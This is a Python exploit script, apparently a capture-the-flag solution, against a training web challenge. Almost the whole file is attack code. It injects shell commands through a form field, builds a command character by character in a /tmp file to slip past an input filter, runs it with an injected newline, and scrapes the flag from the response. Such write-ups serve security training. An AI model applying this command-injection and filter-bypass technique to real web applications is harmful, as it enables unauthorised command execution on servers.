import requests, re
from time import sleep


def gen_payload(ch,dir):
    if ch == ' ':
        return f'\\ \\\\>>/tmp/{dir}'
    elif ch == '/':
        return f'\/\\\\>>/tmp/{dir}'
    elif ch == '>':
        return f'\>\\\\>>/tmp/{dir}'
    elif ch == '<':
        return f'\<\\\\>>/tmp/{dir}'
    elif ch == '-':
        return f'-\\\\>>/tmp/{dir}'
    else:
        return f'{ch}\\\\>>/tmp/{dir}'
    
def main():
    s = requests.Session()
    command = "cat /flagnyQJe"
    url = "https://web-parrot-next-gen.training.bksec.vn:8000/"
    r = s.post(url=url,data={"word":f"\ >/tmp/i"})
    for i in command:
        r = s.post(url=url,data={"word":gen_payload(i,'i')})
        sleep(1)
        if r.status_code == 200 and 'Hắc cơ lỏ, hắc cơ lỏ ><' in r.text:
            print("Filtered !!!")
            r = s.post(url=url,data={"word":f"\ >/tmp/i"})
            break
    r = s.post(url=url, data={"word":"%0ash /tmp/i"})
    flag_pattern = r"BKSEC{.*}"
    flag = re.findall(flag_pattern,r.text)
    if flag:
        print(flag[0])
if __name__ == "__main__":
    print("Running: . . .")
    main()
    print("Finished!!!")